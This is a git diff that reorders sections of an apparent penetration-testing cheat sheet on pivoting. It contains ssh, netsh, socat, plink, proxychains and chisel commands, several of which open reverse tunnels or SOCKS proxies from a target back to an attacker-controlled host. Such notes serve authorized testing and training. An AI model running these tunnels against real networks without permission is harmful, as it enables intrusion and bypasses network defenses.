@@ -30,35 +30,25 @@ ssh -N -L <BIND_ADRESS>:<PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<HOP IP>
 ssh -N user@<ATTACKER IP> -p 22 -L 0.0.0.0:4444:127.0.0.1:4444
 ```
 
+### Port forward netsh
+```
+netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
+```
+
+#### List forwards
+```
+netsh interface portproxy show v4tov4
+```
+
+#### Remove port forward
+```
+netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
+```
+
 ### Remote port forwarding
 #### SSH forward local port of target back to our kali
 ```
 ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
-```
-
-### Proxychains
-- Prepend ```proxychains``` command before every command to send through the proxychain.
-- Change proxychains config to the correct port and protocol! ```vim /etc/proxychains.conf```
-- Example: ```socks4		127.0.0.1 9000```
-
-#### SSH
-```
-sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
-```
-
-#### Chisel
-- https://github.com/jpillora/chisel
-```
-/opt/chisel/chisel server -p 443 --socks5 --reverse
-./chisel.exe client <ATTACKER IP>:443 R:socks
-```
-
-#### Rpivot
-- https://github.com/klsecservices/rpivot
-
-#### Port forwarding plink.exe
-```
-plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
 ```
 
 ### Remote port forward socat Windows
@@ -75,26 +65,36 @@ socat.exe tcp-listen:<LISTENING PORT>,fork tcp-connect:<TARGET IP SECOND HOP>:<T
 socat tcp-l:<LISTENING PORT>,fork tcp:<TARGET IP TO SEND IT TO (FIRST HOP)>:<TARGET PORT>
 ```
 
-### Remote port forward netsh
+#### Port forwarding plink.exe
 ```
-netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
-```
-
-#### List forwards
-```
-netsh interface portproxy show v4tov4
-```
-
-#### Remove port forward
-```
-netsh interface portproxy delete v4tov4 listenaddress=<IP> listenport=<PORT>
+plink.exe <USER>@<IP> -R <ATTACKER PORT>:<TARGET IP>:<TARGET PORT>
 ```
 
 ### Proxychains
+- Prepend ```proxychains``` command before every command to send through the proxychain.
+- Change proxychains config to the correct port and protocol! ```vim /etc/proxychains.conf```
+- Example: ```socks4		127.0.0.1 9000```
+
+#### SSH
+```
+sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
+```
+
 #### Proxychains over hop
 ```
 ssh -J <USER>@<FIRST HOP IP> -D 127.0.0.1:9000 <USER>@<SECOND IP>
 ```
+
+#### Chisel
+- https://github.com/jpillora/chisel
+```
+/opt/chisel/chisel server -p 443 --socks5 --reverse
+./chisel.exe client <ATTACKER IP>:443 R:socks
+```
+
+#### Rpivot
+- https://github.com/klsecservices/rpivot
+
 
 ### sshuttle
 ```
